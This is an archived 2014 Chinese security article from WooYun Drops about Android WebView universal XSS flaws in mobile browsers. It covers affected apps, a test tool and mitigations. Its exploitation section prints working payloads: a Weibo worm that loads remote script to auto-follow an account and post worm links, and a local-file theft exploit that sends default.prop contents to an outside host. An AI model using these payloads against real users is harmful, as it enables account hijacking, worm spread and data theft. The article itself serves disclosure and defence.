@@ -1,0 +1,80 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Android UXSS阶段性小结及自动化测试</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">瘦蛟舞</a> <span class="bull">·</span> <time title="2014/10/14 18:52" ui-time="" datetime="2014/10/14 18:52" class="published ng-binding ng-isolate-scope">2014/10/14 18:52</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 科普</h2><hr><p>WebView(网络视图)android中加载显示网页的重要组件，可以将其视为一个浏览器。在kitkat（android 4.4）以前使用WebKit渲染引擎加载显示网页，在kitkat之后使用谷歌自家内核chromium。</p><p>Uxss(Universal Cross-Site Scripting通用型XSS)UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。可以到达浏览器全局远程执行命令、绕过同源策略、窃取用户资料以及劫持用户的严重危害。</p><p>同源策略所谓同源是指，域名，协议，端口相同，浏览器或者浏览器扩展共同遵循的安全策略。详见：<a href="http://drops.wooyun.org/tips/151">http://drops.wooyun.org/tips/151</a></p><h2>0x01 事件</h2><hr><p>近段时间android UXSS漏洞持续性爆发涉及android应用包括主手机流浏览器、聊天软件等。下面截取几个案例。</p><ul><li><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2014-047674">WooYun: 搜狗手机浏览器跨域脚本执行漏洞之一</a></li><li><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2014-068174">WooYun: 手机QQ安卓版两处跨域问题</a></li><li><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2014-075184">WooYun: 猎豹/360/欧鹏/百度/遨游等手机浏览器安卓客户端UXSS（影响android4.4以下版本）</a></li><li><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2014-075143">WooYun: UC浏览器Android最新版(4.4)跨域漏洞(不受系统版本限制)</a></li></ul><p>引用某厂商对此漏洞的回应</p><pre><code>非常感谢您的报告，此问题属于andriod webkit的漏洞，请尽量使用最新版的andriod系统。
+</code></pre><p>的确漏洞产生的原因是因为kitkat（android 4.4）之前webview组件使用webview内核而遗留的漏洞。使用最新的android系统当然安全性要更高而且运行更流畅，但是有多少人能升级或者使用到相对安全的android版本了。下图来自谷歌官方2014.09.09的统计数据。</p><p><img alt="" img-src="271414f166ac923393eb545d9701e0c7d3c4a215.jpg"></p><p>看起来情况不是太糟糕，有24.5%的android用户是处于相对安全的版本下。但是官方数据的是来google play明显和大陆水土不服。国内就只能使用相对靠谱的本土第三方统计了。下图是umeng八月的统计情况</p><p><img alt="" img-src="96423962a6a111dc8f2ed87d01d664e331dca2cd.jpg"></p><p>能使用到相对安全的android系统的用户不到8%，那么问题来了~我要换一个什么的样的手机了。忘记我是个屌丝了，破手机无法升级到kitkat也没钱换手机。那就只能选择使用相对安全的应用来尽量避免我受到攻击。于是我们收集了一些命中率较高的POC来验证到底哪些app更靠谱一些。</p><ul><li>https://code.google.com/p/chromium/issues/detail?id=37383</li><li>https://code.google.com/p/chromium/issues/detail?id=90222</li><li>https://code.google.com/p/chromium/issues/detail?id=98053</li><li>https://code.google.com/p/chromium/issues/detail?id=117550</li><li>https://code.google.com/p/chromium/issues/detail?id=143437</li><li>https://code.google.com/p/chromium/issues/detail?id=143439</li><li>CVE-2014-6041</li></ul><p>为了方便大家也能够方便测试其他应用我们尝试写出一个自动化的脚本来完成此项工作。</p><h2>0x02 测试</h2><hr><p><a href="http://zone.wooyun.org/content/15792">http://zone.wooyun.org/content/15792</a></p><p>下图为360浏览器在android 4.2.2下的测试结果</p><p><img alt="" img-src="331ec188a2393d9d07124e694f4757caa5acf8d9.jpg"></p><p>下图为搜狗浏览器在android 4.4.3下的测试结果</p><p><img alt="" img-src="3db12b9266bc33094ff3fa633480ca53ffbbb159.jpg"></p><p>测试代码将放入github供大家参考，欢迎大神来修改</p><p>代码地址：<a href="https://github.com/click1/uxss">https://github.com/click1/uxss</a></p><p>在线测试地址：<a href="http://uxss.sinaapp.com/index.php">http://uxss.sinaapp.com/index.php</a></p><h2>0x03 对比</h2><p>我们对主流手机浏览器进行了横向对比，测试对象包括：UC浏览器、搜狗浏览器、百度浏览器、360安全浏览器、欧鹏浏览器、遨游云浏览器、猎豹浏览器。测试结果见下图。</p><p><img alt="" img-src="3f9e1570e14c8b33f9b48dae4ae4c183aa30f800.jpg"></p><h2>0x04 建议</h2><hr><p>厂商（仅供参考）：</p><p>1、服务端禁止iframe嵌套<code>X-FRAME-OPTIONS:DENY</code>。详见：<a href="http://drops.wooyun.org/papers/104">http://drops.wooyun.org/papers/104</a></p><p>2、客户端使用<code>setAllowFileAccess(false)</code>方法禁止webview访问本地域。详见：<a href="http://developer.android.com/intl/zh-cn/reference/android/webkit/WebSettings.html#setAllowFileAccess(boolean)">setAllowFileAccess(boolean)</a></p><p>3、客户端使用<code>onPageStarted (WebView view, String url, Bitmap favicon)</code>方法在跳转前进行跨域判断。详见&#91;onPageStarted (WebView view, String url, Bitmap favicon)&#93;&#91;8&#93;</p><p>4、客户端对iframe object标签属性进行过滤。</p><p>用户：</p><p>1、使用漏洞较少的app，及时更新app。</p><p>2、不要随意打开一些莫名其妙的链接。</p><p>3、有钱你就买新手机吧，android L马上出来了。（可以通过google play推送安全补丁,呵呵）</p><h2>0x05 利用</h2><hr><p>（此部分考虑到影响并未第一时间放出，现在漏洞已经被忽略，在此更新）</p><p>1、 <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2014-079471">WooYun: 扫描新浪微博安卓客户端UXSS附蠕虫利用</a> 蠕虫代码如下：</p><p>test.html</p><pre><code>&lt;iframe name="m" src="http://m.weibo.cn/xxx" onload="window.open('\u0000javascript:window.s%3Ddocument.createElement%28%27script%27%29%3Bwindow.s.src%3D%27http://site/test.js%27%3Bdocument.body.appendChild%28window.s%29%3B','m')" &gt;
+</code></pre><p>test.js</p><pre><code>url = 'http://m.weibo.cn/attentionDeal/addAttention?';
+
+url2 = 'http://m.weibo.cn/mblogDeal/addAMblog?rl=1';
+
+function createXHR(){
+
+    return window.XMLHttpRequest?
+
+    new XMLHttpRequest():
+
+    new ActiveXObject("Microsoft.XMLHTTP");
+
+}
+
+
+
+
+
+function post(url,data,sync){
+
+    xmlHttp = createXHR();
+
+    xmlHttp.open("POST",url,sync);
+
+    xmlHttp.setRequestHeader("Accept","text/html, application/xhtml+xml, */*");
+
+    xmlHttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
+
+    xmlHttp.send(data);
+
+}
+
+
+
+function send(){
+
+    data = 'uid=3605736194';
+
+    data2 = 'content=http://site/worm.html';
+
+    post(url,data,false);
+
+    post(url2,data2,false);
+
+}
+
+
+
+function main(){
+
+    try{
+
+    send();
+
+    alert("done");
+
+    }
+
+    catch(e){alert("error");}
+
+}
+
+main();
+</code></pre><p><img alt="" img-src="cb8ebacae692d62ad9a9bbd73e4b159122e9bcc1.jpg"></p><p><img alt="" img-src="93f4791c5f951868bbac6d6f3f2e668945d83dad.jpg"></p><p>2、窃取本地文件</p><p>test.html</p><pre><code>&lt;button onclick="iframe.src='http://notfound/'"&gt;x&lt;/button&gt;&lt;br&gt;
+&lt;button onclick="exploit1()"&gt;Get local file!&lt;/button&gt;&lt;br&gt;
+&lt;script&gt;
+function exploit1() {
+    window.open('\u0000javascript:document.body.innerHTML="&lt;script/src=http://site/test.js&gt;&lt;/scr"+"ipt&gt;&lt;iframe src=file:/default.prop onload=exploit2()  style=width:100%;height:1000px; name=test2&gt;&lt;/iframe&gt;";','test');
+}
+&lt;/script&gt;
+&lt;iframe src="http://m.baidu.com/" id="iframe" style="width:100%;height:1000px;" name="test"&gt;&lt;/iframe&gt;
+</code></pre><p>test.js</p><pre><code>var flag = 0;
+function exploit2(){
+  if(flag) {return}
+ window.open('\u0000javascript:location.replace("http://site/cross/test.php?test="+escape(document.body.innerHTML))','test2');
+  flag = 1;
+}
+</code></pre><p>服务端接收到android的default.prop文件内容。也可以窃取相应app私有目录/data/data/packagename/下文件</p><p><img alt="" img-src="0d9067356552379f46ff4003706cd8491e73bfb8.jpg"></p><h2>0x06 参考</h2><hr><p><a href="http://static.wooyun.org/upload/summit-wooyun-RAyH4c.zip">RAyH4c（茄子）《细数安卓WebView的那些神洞》</a></p><p><a href="http://zone.wooyun.org/content/15792">http://zone.wooyun.org/content/15792</a></p><p><a href="static/drops/full/93f4791c5f951868bbac6d6f3f2e668945d83dad.jpg">8</a>: http://developer.android.com/intl/zh-cn/reference/android/webkit/WebViewClient.html#onPageStarted(android.webkit.WebView, java.lang.String, android.graphics.Bitmap)</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="donate" style="padding:10px;border-top:1px solid #d9d9d9;text-align:center"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/20141223141529d33ebc5e18e728db5f4a24d40002e9d1.jpg" style="width:200px;height:200px"></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/news/1069" rel="bookmark" id="re1">GOOGLE赶在PWN2OWN之前修复了四个高危漏洞</a></li><li><a href="http://drops.wooyun.org/mobile/7030" rel="bookmark" id="re2">Hacking Team Android Browser Exploit代码分析</a></li><li><a href="http://drops.wooyun.org/papers/5164" rel="bookmark" id="re3">Android SecureRandom漏洞详解</a></li><li><a href="http://drops.wooyun.org/tips/2997" rel="bookmark" id="re4">Android App Injection&#038;&Drozer Use</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xFrank</span> <span class="reply-time">2015-03-11 17:12:15</span></div><p></p><p>大赞!</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">老和尚</span> <span class="reply-time">2014-11-08 10:14:21</span></div><p></p><p>不错啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">浮萍</span> <span class="reply-time">2014-10-23 14:24:10</span></div><p></p><p>赞一个啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">呵呵</span> <span class="reply-time">2014-10-21 17:36:52</span></div><p></p><p>激活码这难弄</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">大风对我说</span> <span class="reply-time">2014-10-19 22:36:41</span></div><p></p><p>赞，感谢分享</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">进击的zjx</span> <span class="reply-time">2014-10-15 19:38:35</span></div><p></p><p>后排顶瘦瘦，已加入收藏</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xxxxxxx</span> <span class="reply-time">2014-10-15 18:48:29</span></div><p></p><p>收个激活码</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瘦蛟舞</span> <span class="reply-time">2014-10-15 17:28:42</span></div><p></p><p>这个主要是用来测android的，ios下是能造成拒绝服务。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">破锁</span> <span class="reply-time">2014-10-15 17:23:03</span></div><p></p><p>iPhone闪退，咋整</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">zzR</span> <span class="reply-time">2014-10-15 15:33:31</span></div><p></p><p>怒赞</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2014-10-15 10:49:33</span></div><p></p><p>赞，已收藏</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">铁蛋火车侠</span> <span class="reply-time">2014-10-15 10:41:35</span></div><p></p><p>牛叉 果断收藏了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瘦蛟舞</span> <span class="reply-time">2014-10-15 09:48:29</span></div><p></p><p>谢谢，已更正</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">0x_Jin</span> <span class="reply-time">2014-10-15 09:41:05</span></div><p></p><p>赞，已收藏</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">带馅儿馒头</span> <span class="reply-time">2014-10-15 00:20:54</span></div><p></p><p>good job~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">gainover</span> <span class="reply-time">2014-10-15 00:18:54</span></div><p></p><p>赞，已收藏</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">gainover</span> <span class="reply-time">2014-10-15 00:17:24</span></div><p></p><p>setAllowFileAccess(flase) -&gt; false ，单词错了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2014-10-14 21:57:20</span></div><p></p><p>哈哈 不错</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">健宇</span> <span class="reply-time">2014-10-14 19:20:43</span></div><p></p><p>赞一个~</p><p></p></div></div></div></div></div></main>
